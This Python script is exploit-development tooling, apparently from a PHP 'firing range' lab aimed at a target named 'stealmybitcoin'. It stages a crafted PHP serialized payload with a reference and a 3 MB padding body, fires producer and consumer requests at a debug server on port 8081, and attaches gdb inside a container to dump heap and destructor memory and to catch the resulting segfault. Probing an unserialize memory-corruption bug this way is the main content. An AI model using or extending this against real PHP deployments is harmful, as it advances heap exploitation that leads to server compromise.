#!/usr/bin/env python3
"""Crash triage of the groom consumer on the :8081 debug server."""
import subprocess
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_oracle as o
import dbgbg
from smb_dbg_experiment import (CT, launch_debug, stage_rw, fire,
                                mp_min_body, producer_session, sh)


def main():
    print("launch:", launch_debug())
    sid = f"ct{int(time.time())}"
    stage_rw(sid, producer_session())
    print("producer:", fire(mp_min_body(sid)))
    bg, _ = dbgbg.read_bg()
    print("BG:", bg and (hex(bg[0]), bg[1]))
    if not bg or bg[1] != 1:
        print("no remnant; abort")
        return 1
    d = bg[0]
    # dump d BEFORE the consumer (what survived the producer + churn)
    open("/home/user/php-firing-range/scripts/d-dump.gdb", "w").write(
        "set pagination off\nset confirm off\nset auto-solib-add off\n"
        f"x/8gx 0x{d:x}\nx/4gx 0x{d+0x3f0:x}\n"
        "detach\nquit\n")
    r = subprocess.run(["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
                        "--pid=container:" + CT, "-v",
                        "/home/user/php-firing-range/scripts:/sc:ro",
                        "smb-gdb-helper", "sh", "-c",
                        "P=$(for p in $(pgrep -f 8081); do "
                        "[ \"$(cat /proc/$p/comm)\" = php ] && echo $p; done | head -1); "
                        "gdb -batch -p $P -x /sc/d-dump.gdb 2>/dev/null | grep '0x'"],
                       capture_output=True, text=True, timeout=120)
    print("d BEFORE consumer:\n" + r.stdout)
    # dump d + the dtor chunk BEFORE the consumer
    open("/home/user/php-firing-range/scripts/d-dump.gdb", "w").write(
        "set pagination off\nset confirm off\nset auto-solib-add off\n"
        f"x/8gx 0x{d:x}\nx/16gx 0x{d+0x3000:x}\n"
        "detach\nquit\n")
    r = subprocess.run(["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
                        "--pid=container:" + CT, "-v",
                        "/home/user/php-firing-range/scripts:/sc:ro",
                        "smb-gdb-helper", "sh", "-c",
                        "P=$(for p in $(pgrep -f 8081); do "
                        "[ \"$(cat /proc/$p/comm)\" = php ] && echo $p; done | head -1); "
                        "gdb -batch -p $P -x /sc/d-dump.gdb 2>/dev/null | grep '0x'"],
                       capture_output=True, text=True, timeout=120)
    print("d + dtor BEFORE consumer:\n" + r.stdout)
    # attach crash-catcher, fire consumer
    gsid = f"ctc{int(time.time())}"
    stage_rw(gsid, b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:3;}' + b"A" * (3 * 1024 * 1024))
    import smb_oracle2 as o2
    import re
    dd = subprocess.run(["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
                        "--pid=container:" + CT, "-v",
                        "/home/user/php-firing-range/scripts:/sc:ro",
                        "smb-gdb-helper", "sh", "-c",
                        "P=$(for p in $(pgrep -f 8081); do "
                        "[ \"$(cat /proc/$p/comm)\" = php ] && echo $p; done | head -1); "
                        f"gdb -batch -p $P -ex 'x/4gx 0x{d:x}' -ex quit 2>/dev/null | grep '0x'"],
                       capture_output=True, text=True, timeout=120).stdout
    last_dtor = None
    for line in dd.splitlines():
        if '0x' in line and ':' in line and ' in ' not in line:
            try:
                addr = int(line.split(':')[0].strip(), 16)
                if addr == d:
                    last_dtor = int(line.split(':')[1].split()[1], 16)
            except Exception:
                pass
    print("last_dtor:", hex(last_dtor) if last_dtor else None)
    import smb_oracle as o1
    body = o1.build_body(gsid, d, None)
    open("/tmp/dbg-body.bin", "wb").write(body)
    subprocess.run(["docker", "cp", "/tmp/dbg-body.bin", CT + ":/tmp/dbg-body.bin"],
                   check=True)
    # crash-catcher with the KNOWN d and dtor-page addresses baked in
    open("/home/user/php-firing-range/scripts/dbg-crash.gdb", "w").write(
        "set pagination off\nset confirm off\nset auto-solib-add off\n"
        "handle SIGSEGV stop print nopass\ncontinue\n"
        "echo ===CRASH===\n"
        "info registers x0 x1 x2 x4 x19 x20 x21 x22 pc\n"
        "x/4i $pc\n"
        f"echo ===D===\nx/10gx 0x{d:x}\n"
        f"echo ===DTORPAGE===\nx/32gx 0x{last_dtor:x}\n"
        "detach\nquit\n")
    cmd = ["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
           "--pid=container:" + CT, "-v",
           "/home/user/php-firing-range/scripts:/sc:ro",
           "smb-gdb-helper", "sh", "-c",
           "P=$(for p in $(pgrep -f 8081); do "
           "[ \"$(cat /proc/$p/comm)\" = php ] && echo $p; done | head -1); "
           "gdb -batch -p $P -x /sc/dbg-crash.gdb"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True)
    for i in range(20):
        time.sleep(1)
    print("[firing consumer]")
    print("consumer:", fire(body))
    try:
        out, _ = proc.communicate(timeout=150)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
    open("lanes/stealmybitcoin/dbg-crash81.log", "w").write(out)
    m = out.find("===CRASH===")
    print(out[m:m + 1200] if m >= 0 else "(no crash)\n" + out[:600])


if __name__ == "__main__":
    main()
